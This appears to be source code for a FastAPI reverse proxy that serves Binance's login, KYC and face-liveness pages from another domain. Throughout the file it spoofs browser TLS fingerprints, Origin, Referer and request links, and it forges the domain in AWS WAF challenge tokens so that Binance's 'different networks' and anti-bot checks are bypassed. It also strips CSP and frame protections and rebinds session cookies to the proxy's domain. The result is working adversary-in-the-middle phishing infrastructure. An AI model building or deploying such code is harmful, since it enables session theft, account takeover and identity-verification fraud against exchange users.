import asyncio
import base64
import json
import logging
import os
import re
from urllib.parse import urlparse, urlunparse

import aiohttp
import httpx
from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import Response

from db.queries import get_proxy_for_sub, get_proxy_for_exchange_sub
from chrome.client import ChromeRetryClient

try:
    # Browser-TLS egress (curl_cffi). Optional: if curl_cffi is not installed
    # in the deployment, fall back to the httpx client below (no crash).
    from chrome.browser_egress import BrowserEgressClient
except Exception:  # noqa: BLE001 - degrade gracefully
    BrowserEgressClient = None

router = APIRouter(tags=["gateway-proxy"])
logger = logging.getLogger("gateway_proxy")

# Browser-TLS egress: impersonate a real browser so the egress handshake
# (JA3/JA4 + HTTP/2 + UA) matches the creation browser and passes Binance's
# «different networks» secure-link check. Override via env to match the exact
# fingerprint of the browser used to generate the link.
BROWSER_IMPERSONATE = os.getenv("BROWSER_EGRESS_IMPERSONATE", "chrome131_android")
BROWSER_USER_AGENT = os.getenv("BROWSER_EGRESS_USER_AGENT") or None


def _make_egress_client(proxy):
    """Browser-TLS egress client (curl_cffi) when available, else httpx.

    Both expose the same interface (async context manager + request_with_retry).
    """
    if BrowserEgressClient is not None:
        return BrowserEgressClient(
            proxy=proxy,
            impersonate=BROWSER_IMPERSONATE,
            user_agent=BROWSER_USER_AGENT,
        )
    return ChromeRetryClient(proxy=proxy)

UPSTREAM_HTTP_HOST = "www.binance.com"

# Любой домен Binance (apex и поддомены), опционально с явным портом
BINANCE_NETLOC_RE = re.compile(r"^(?:[a-z0-9-]+\.)*binance\.com(?::\d+)?$", re.IGNORECASE)
UPSTREAM_HTTP_URL = f"https://{UPSTREAM_HTTP_HOST}"
UPSTREAM_WS_HOST = "stream.binance.com"
UPSTREAM_WS_URL = f"wss://{UPSTREAM_WS_HOST}:9443/ws"

# Токен-сервисы AWS WAF (challenge.js, inputs, mp_verify, telemetry).
# Проксируются через тот же egress, чтобы WAF-токен и защищённая страница
# наблюдались с одного IP.
WAF_HOST_RE = re.compile(
    r"^(?P<host>[a-z0-9-]+(?:\.[a-z0-9-]+)*\."
    r"(?:token\.awswaf\.com|waf\.a2z\.org\.cn|waf\.aws\.a2z\.eu))$",
    re.IGNORECASE,
)

# Хосты, доступные через base64 path-префикс шлюза (b64(host) как первый
# сегмент пути). Помимо WAF-сервисов — поддомены binance.com (напр.,
# accounts.binance.com с KYC-виджетом в iframe) и CDN binance: их /static/
# отдаёт 403 для Referer вне binance, а в заблокированных регионах прямой
# выход может быть недоступен вообще — уводим всё через шлюз.
PROXY_HOST_RE = re.compile(
    r"^(?:"
    r"[a-z0-9-]+(?:\.[a-z0-9-]+)*\.(?:token\.awswaf\.com|waf\.a2z\.org\.cn|waf\.aws\.a2z\.eu)"
    r"|(?:[a-z0-9-]+\.)*binance\.com"
    r"|(?:bin|public)\.bnbstatic\.com"
    r")$",
    re.IGNORECASE,
)

# Абсолютные URL хостов, которые нужно переписывать через шлюз в
# HTML/JS/CSS/JSON ответах: WAF-токен-сервисы, binance.com
# (apex+поддомены) и CDN bnbstatic.
# Абсолютные URL хостов, которые нужно переписывать через шлюз в
# HTML/JS/CSS/JSON ответах. Паттерны разбиты по семействам хостов и
# применяются ТОЛЬКО если хост реально есть в теле (см. _rewrite_waf_urls):
# на больших JS-бандлах это ~40x быстрее единой большой alternation.
BINANCE_URL_RE = re.compile(
    r"(?:(\w+):)?//((?:[a-z0-9-]+\.)*binance\.com)(?::\d+)?([^\s\"'<>\\]*)",
    re.IGNORECASE,
)
BNBST_URL_RE = re.compile(
    r"(?:(\w+):)?//((?:bin|public)\.bnbstatic\.com)(?::\d+)?([^\s\"'<>\\]*)",
    re.IGNORECASE,
)
# Скрытый iframe KYC-SPA: хост собирается как
# "accounts." + последние два лейбла location.hostname (такого домена
# не существует) — фиксируем его на b64-маршрут шлюза.
SWITCH_IFRAME_RE = re.compile(
    r'"accounts\."\.concat\(\s*window\.location\.hostname\s*\.split\("\."\)\s*'
    r"\.slice\(-2\)\s*\.join\(\"\.\"\)\s*\)"
)
# Полный абсолютный URL WAF-токен-сервиса: хост + path/query, как он
# записан в HTML/JS (заканчивается кавычкой, пробелом или < >).
WAF_URL_RE = re.compile(
    r"https://([a-z0-9-]+(?:\.[a-z0-9-]+)*\."
    r"(?:token\.awswaf\.com|waf\.a2z\.org\.cn|waf\.aws\.a2z\.eu))"
    r"([^\s\"'<>]*)",
    re.IGNORECASE,
)

# KYC-only: допустимые upstream-адреса шлюза (default-deny).
# Зеркало служит только KYC-флоу — всё остальное на binance.com
# (трейдинг, депозиты и т.п.) не проксируется.
ALLOWED_STATIC_HOSTS = {"bin.bnbstatic.com", "public.bnbstatic.com"}
KYC_PAGE_RE = re.compile(r"^/[a-z0-9-]+/kyc-center", re.IGNORECASE)
LOGIN_PAGE_RE = re.compile(r"^/[a-z0-9-]+/(?:login|register)", re.IGNORECASE)
# Liveness/face-detection report endpoint used by the KYC widget.
FVIDEO_PAGE_RE = re.compile(r"^/fvideo/", re.IGNORECASE)


def _upstream_allowed(upstream_host: str, upstream_path: str) -> bool:
    """Разрешено ли проксировать указанный upstream (host, path).

    - WAF-токен-сервисы: челлендж (challenge.js/inputs/mp_verify).
    - CDN bnbstatic (bin/public): статика и i18n SPA.
    - accounts.binance.com: только /login (скрытый iframe синхронизации
      сессии KYC-виджета).
    - www.binance.com: только KYC-страница, login/register, /fvideo/
      (liveness report) и /bapi/ API, которые она использует.
    """
    host = upstream_host.lower()
    if WAF_HOST_RE.match(host):
        return True
    if host in ALLOWED_STATIC_HOSTS:
        return True
    if host == "accounts.binance.com":
        return bool(LOGIN_PAGE_RE.match(upstream_path))
    if host in (UPSTREAM_HTTP_HOST, "binance.com"):
        return (
            bool(KYC_PAGE_RE.match(upstream_path))
            or bool(LOGIN_PAGE_RE.match(upstream_path))
            or bool(FVIDEO_PAGE_RE.match(upstream_path))
            or upstream_path.startswith("/bapi/")
        )
    return False


HOP_BY_HOP_HEADERS = {
    "host",
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "te",
    "trailers",
    "transfer-encoding",
    "upgrade",
    "content-length",
    "accept-encoding",
}


def _rewrite_set_cookie(cookie: str) -> str:
    """Удаляет атрибут Domain из Set-Cookie для привязки к локальному шлюзу."""
    res = re.sub(r"(?i)(;\s*domain=[^;]+)", "", cookie)
    return re.sub(r";{2,}", ";", res).strip().rstrip(";")


def _proxy_origin(request: Request) -> str:
    """Формирует Origin на основе входящего адреса шлюза."""
    host = request.headers.get("host", request.url.netloc)
    sch = request.headers.get("x-forwarded-proto", request.url.scheme or "https").split(",")[0].strip().lower()
    scheme = "https" if sch in ("https", "wss") else "http"
    return f"{scheme}://{host}"


def _rewrite_location(location: str, request: Request) -> str:
    """Переписывает заголовки редиректов Location на домен прокси-шлюза."""
    if not location:
        return location
    try:
        p = urlparse(location)
        if p.scheme and p.netloc and BINANCE_NETLOC_RE.match(p.netloc):
            host = request.headers.get("host", request.url.netloc)
            sch = request.headers.get("x-forwarded-proto", "https").split(",")[0].strip()
            return urlunparse((sch, host, p.path, p.params, p.query, p.fragment))
        if p.scheme == "https" and p.netloc and WAF_HOST_RE.match(p.netloc):
            host = request.headers.get("host", request.url.netloc)
            return urlunparse(("https", host, f"/{_waf_host_encode(p.netloc)}{p.path}", p.params, p.query, p.fragment))
    except Exception:
        pass
    return location


def _waf_host_encode(host: str) -> str:
    """Непрозрачный path-сегмент для хоста WAF-токен-сервиса.

    Base64url не содержит точек, поэтому переписанный URL challenge.js
    не совпадает с паттерном awswaf.com, и скрипт берёт префикс
    endpoints (inputs/mp_verify) из собственного src.
    """
    return base64.urlsafe_b64encode(host.encode("utf-8")).rstrip(b"=").decode("ascii")


def _waf_host_decode(segment: str) -> str | None:
    """Восстановление хоста upstream из base64 path-сегмента.

    Принимаем не только WAF-токен-сервисы, но и binance-домены/CDN
    (см. PROXY_HOST_RE) — они проксируются тем же механизмом.
    """
    try:
        padded = segment + "=" * (-len(segment) % 4)
        host = base64.urlsafe_b64decode(padded).decode("utf-8")
    except Exception:
        return None
    return host if PROXY_HOST_RE.match(host) else None


def _rewrite_waf_urls(text: str, proxy_host: str) -> str:
    """Перенаправляет абсолютные ссылки на управляемые хосты через шлюз.

    - WAF-токен-сервис: challenge.js определяет префикс endpoints
      (inputs/mp_verify) по своему URL, если его src не принадлежит
      awswaf.com, поэтому достаточно переписать <script src> в HTML.
      До URL без query добавляем dummy-запрос: токен-сервис отвечает 502
      на «голые» пути (напр., /challenge.js) с egress-IP, но игнорирует
      неизвестные query-параметры.
    - www.binance.com → корень шлюза (upstream по умолчанию).
    - Остальные binance-поддомены (accounts и т.п.) и CDN bnbstatic →
      base64 path-префикс: bin.bnbstatic.com/static отдаёт 403 для
      Referer вне binance, а прямой выход недоступен в заблокированных
      регионах — все ресурсы должны ходить через шлюз, чтобы URL страницы
      оставался на домене шлюза.
    """

    out = text
    if "binance.com" in out:

        def _sub_bn(m: re.Match) -> str:
            scheme, host, rest = m.group(1), m.group(2), m.group(3) or ""
            if scheme is not None and scheme.lower() not in ("http", "https"):
                return m.group(0)  # wss:/data:/... — не трогаем
            host_l = host.lower()
            if host_l in ("www.binance.com", "binance.com"):
                url = f"{scheme or 'https'}://{proxy_host}{rest}"
            else:
                url = f"{scheme or 'https'}://{proxy_host}/{_waf_host_encode(host_l)}{rest}"
            if WAF_HOST_RE.match(host_l) and rest and "?" not in rest:
                url += "?cb=1"
            return url

        out = BINANCE_URL_RE.sub(_sub_bn, out)
    if "bnbstatic.com" in out:

        def _sub_bnb(m: re.Match) -> str:
            scheme, host, rest = m.group(1), m.group(2), m.group(3) or ""
            if scheme is not None and scheme.lower() not in ("http", "https"):
                return m.group(0)
            return f"{scheme or 'https'}://{proxy_host}/{_waf_host_encode(host.lower())}{rest}"

        out = BNBST_URL_RE.sub(_sub_bnb, out)
    if "awswaf.com" in out or "a2z." in out:

        def _sub_waf(m: re.Match) -> str:
            host, rest = m.group(1), m.group(2)
            url = f"https://{proxy_host}/{_waf_host_encode(host)}{rest}"
            if rest and "?" not in rest:
                url += "?cb=1"
            return url

        out = WAF_URL_RE.sub(_sub_waf, out)
    if "switch/callback" in out:
        out = SWITCH_IFRAME_RE.sub(
            '"' + proxy_host.rstrip("/") + "/" + _waf_host_encode("accounts.binance.com") + '"',
            out,
        )
    return out


def _add_cors(response: Response, request: Request) -> None:
    """Устанавливает стандартизированные заголовки CORS для внутреннего API."""
    response.headers["Access-Control-Allow-Origin"] = _proxy_origin(request)
    response.headers["Access-Control-Allow-Credentials"] = "true"


@router.get("/health/ip")
async def current_proxy_ip(request: Request):
    """Проверка внешнего сетевого интерфейса прокси-узла."""
    sub = request.url.hostname.split(".")[0]
    http_proxy = await get_proxy_for_sub(str(sub))
    try:
        async with ChromeRetryClient(proxy=http_proxy) as client:
            resp = await client.request_with_retry(
                "GET",
                "https://api.ipify.org?format=json",
                timeout=httpx.Timeout(15.0)
            )
            return resp.json()
    except Exception as e:
        logger.error(f"Egress check error: {e}")
        return Response(content=f"Gateway Error: {e}", status_code=502)


def _rewrite_query_proxy_host(query: str, proxy_host: str) -> str:
    """Переписать хост прокси в параметрах запроса (напр. requestLink).

    SPA отправляет бэкенду URL текущей страницы (requestLink=...) — со стороны
    бэкенда это должна быть ссылка binance.com, иначе compliance-эндпоинты
    отвечают 403. Формат значения — host[:port]/path без схемы (как на
    настоящей странице binance), хост может быть в raw или %-encoded форме.
    """
    if not query or not proxy_host:
        return query
    host, _, port = proxy_host.partition(":")
    variants = []
    if port:
        variants += [host + ":" + port, host + "%3A" + port]
    else:
        variants.append(host)
    out = query
    for v in variants:
        if v in out:
            out = out.replace(v, UPSTREAM_HTTP_HOST)
    return out


def _patch_waf_token_domain(body: bytes, new_domain: str) -> bytes:
    """Переписать поле domain в solution_metadata (multipart) mp_verify.

    challenge.js берёт домен токена из window.location.hostname — т.е. хост
    прокси. Токен, привязанный к хосту прокси, WAF защищённого ресурса
    (www.binance.com) отклоняет при проверке (домен не совпадает). Пишем
    домен защищённого ресурса, чтобы токен был валиден на цели.
    """
    try:
        m = re.search(
            rb'name="solution_metadata"\r?\n\r?\n(.*?)(?=\r?\n--)',
            body, re.S,
        )
        if not m:
            return body
        meta = json.loads(m.group(1))
        if isinstance(meta, dict) and meta.get("domain") != new_domain:
            meta["domain"] = new_domain
            return body[: m.start(1)] + json.dumps(meta).encode() + body[m.end(1):]
    except Exception:
        logger.exception("Не удалось переписать domain в mp_verify теле")
    return body


@router.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
async def proxy_http(path: str, request: Request):
    """Проксирование HTTP-запросов к целевому микросервису."""
    sub = request.url.hostname.split(".")[0]
    query = request.url.query
    proxy_host = request.headers.get("host", request.url.netloc)

    # Первый сегмент пути может быть (base64) хостом WAF-токен-сервиса: pass-through
    first_segment = path.split("/", 1)[0]
    waf_host = _waf_host_decode(first_segment)
    if waf_host:
        upstream_host = waf_host.lower()
        upstream_path = path[len(first_segment):] or "/"
    else:
        upstream_host = UPSTREAM_HTTP_HOST
        upstream_path = "/" + path

    # cookie-manager вычисляет путь к конфигуратору cookies из hostname
    # (getverified.cc -> getverified-cc), такого пути на CDN нет (403).
    # Переписываем на известную рабочую dev-ветку, чтобы конфиг загружался.
    upstream_path = re.sub(
        r"(/static/cookie-manager/)[^/]+/cookie-list\.json",
        r"\1dev/cookie-list.json",
        upstream_path,
    )

    # KYC-only: вне allow-list не проксируем (403), чтобы зеркалом
    # нельзя было пользоваться как общим Binance gateway.
    if not _upstream_allowed(upstream_host, upstream_path):
        return Response(
            content="This gateway serves only the Binance KYC flow.",
            status_code=403,
        )

    if not waf_host and query:
        # SPA шлёт бэкенду ссылку текущей страницы (requestLink и т.п.) —
        # для бэкенда это должна быть ссылка binance.com, а не хост прокси
        query = _rewrite_query_proxy_host(query, proxy_host)

    origin_url = f"https://{upstream_host}"
    target_url = origin_url + upstream_path + (f"?{query}" if query else "")
    if waf_host and WAF_HOST_RE.match(upstream_host) and not query:
        # Токен-сервис возвращает 502 на «голые» пути с egress-IP —
        # подстраховываемся dummy-запросом (неизвестные параметры игнорируются)
        target_url += "?cb=1"
    http_proxy = await get_proxy_for_exchange_sub(sub=str(sub), exchange="binance")

    # bnbstatic (CDN-статика) не зависит от IP-адреса: отдаём её напрямую
    # (быстрый datacenter-егресс), а не через медленный residential-прокси —
    # иначе крупные JS-чанки (напр. mfa-ui ~2MB) не успевают в таймаут
    # фронтенда и падают 504 Gateway Timeout, ломая загрузку KYC-виджета.
    # KYC-API (bapi/WAF) продолжает ходить через residential ради IP-консистентности.
    if upstream_host in ALLOWED_STATIC_HOSTS:
        http_proxy = None

    # Фильтрация служебных заголовков.
    # origin/referer входящего запроса (указывают на хост прокси) удаляем,
    # чтобы не слать дублирующиеся заголовки: WAF-токен-сервис определяет
    # домен токена из ПЕРВОГО origin/referer, и токен, привязанный к хосту
    # прокси, будет отклонён защищённым доменом (www.binance.com) при проверке.
    headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in HOP_BY_HOP_HEADERS
        and k.lower() not in ("user-agent", "origin", "referer")
    }
    headers["Host"] = upstream_host
    headers["Origin"] = UPSTREAM_HTTP_URL
    if waf_host:
        # WAF-сервису показываем referer со стороны защищённого домена
        referer = request.headers.get("referer", "")
        ref = urlparse(referer) if referer else None
        if ref and ref.hostname and ref.hostname == request.url.hostname:
            ref_query = f"?{ref.query}" if ref.query else ""
            headers["Referer"] = f"{UPSTREAM_HTTP_URL}{ref.path or '/'}{ref_query}"
        else:
            headers["Referer"] = f"{UPSTREAM_HTTP_URL}/"
    else:
        headers["Referer"] = f"{UPSTREAM_HTTP_URL}/{path}"

    body = await request.body()

    # Токен должен быть привязан к домену цели (см. _patch_waf_token_domain).
    # binance.com — корневой домен protection pack: валиден для всех
    # поддоменов (www.binance.com, accounts.binance.com, ...).
    if (
        waf_host
        and "mp_verify" in upstream_path
        and request.method == "POST"
        and isinstance(body, (bytes, bytearray))
    ):
        body = _patch_waf_token_domain(bytes(body), "binance.com")

    try:
        async with _make_egress_client(http_proxy) as client:
            upstream_resp = await client.request_with_retry(
                method=request.method,
                url=target_url,
                headers=headers,
                content=body,
                cookies=request.cookies,
                timeout=httpx.Timeout(30.0),
                follow_redirects=False,
            )
    except Exception as e:
        logger.error(f"HTTP Gateway Error [{target_url}]: {e}")
        return Response(content=f"Gateway error: {e}", status_code=502)

    # Проброс заголовков ответа
    passthrough_headers = {
        k: v for k, v in upstream_resp.headers.items()
        if k.lower() not in {
            "content-encoding",
            "transfer-encoding",
            "connection",
            "content-length",
            "set-cookie",
            "content-security-policy",
            "x-frame-options"
        }
    }

    # Уводим управляемые URL (WAF-endpoints, binance-поддомены, CDN) через
    # шлюз в HTML/JS/CSS/JSON, чтобы вся загрузка и все переходы оставались
    # на домене шлюза.
    content = upstream_resp.content
    ctype = (upstream_resp.headers.get("content-type") or "").lower()
    if content and any(t in ctype for t in ("text/html", "javascript", "json", "css")):
        # Быстрый pre-filter: если в теле нет управляемых хостов —
        # decode/regex не нужны вообще (большинство JS/CSS/JSON).
        if (
            b"binance" in content
            or b"bnbstatic" in content
            or b"awswaf" in content
            or b"a2z" in content
            or b"switch/callback" in content
        ):
            try:
                text = content.decode("utf-8", errors="replace")
                text = _rewrite_waf_urls(text, proxy_host)
                content = text.encode("utf-8")
            except Exception:
                logger.exception("Upstream URL rewrite error")

    if upstream_resp.status_code in (301, 302, 303, 307, 308):
        resp = Response(
            content=content or b"",
            status_code=upstream_resp.status_code,
            headers=passthrough_headers
        )
        resp.headers["Location"] = _rewrite_location(upstream_resp.headers.get("location", ""), request)
    else:
        resp = Response(
            content=content,
            status_code=upstream_resp.status_code,
            headers=passthrough_headers
        )

    # Перезапись атрибутов сессионных кук
    cookies = (
        upstream_resp.headers.get_list("set-cookie")
        if hasattr(upstream_resp.headers, "get_list")
        else [v for k, v in upstream_resp.headers.items() if k.lower() == "set-cookie"]
    )
    for c in cookies:
        resp.headers.append("set-cookie", _rewrite_set_cookie(c))

    _add_cors(resp, request)
    return resp


@router.websocket("/{path:path}")
async def proxy_ws(websocket: WebSocket, path: str):
    """Проксирование дуплексных WebSocket-соединений."""
    await websocket.accept()
    query = str(websocket.query_params)
    clean_path = path if path.startswith("/") else f"/{path}"

    target_url = f"wss://{UPSTREAM_WS_HOST}{clean_path}" + (f"?{query}" if query else "")

    headers = {
        k: v for k, v in dict(websocket.headers).items()
        if k.lower() not in HOP_BY_HOP_HEADERS
    }
    headers["Host"] = UPSTREAM_WS_HOST
    headers["Origin"] = UPSTREAM_HTTP_URL

    async with aiohttp.ClientSession() as session:
        try:
            upstream_ws = await session.ws_connect(target_url, headers=headers, ssl=False)
        except Exception as e:
            logger.error(f"WS Gateway Connect Error ({target_url}): {e}")
            await websocket.close()
            return

        async def forward_up():
            try:
                async for msg in upstream_ws:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        await websocket.send_text(msg.data)
                    elif msg.type == aiohttp.WSMsgType.BINARY:
                        await websocket.send_bytes(msg.data)
                    elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                        await websocket.close()
                        break
            except Exception:
                await websocket.close()

        async def forward_down():
            try:
                while True:
                    data = await websocket.receive()
                    if "text" in data:
                        await upstream_ws.send_str(data["text"])
                    elif "bytes" in data:
                        await upstream_ws.send_bytes(data["bytes"])
            except WebSocketDisconnect:
                await upstream_ws.close()
            except Exception:
                await upstream_ws.close()

        await asyncio.gather(forward_up(), forward_down())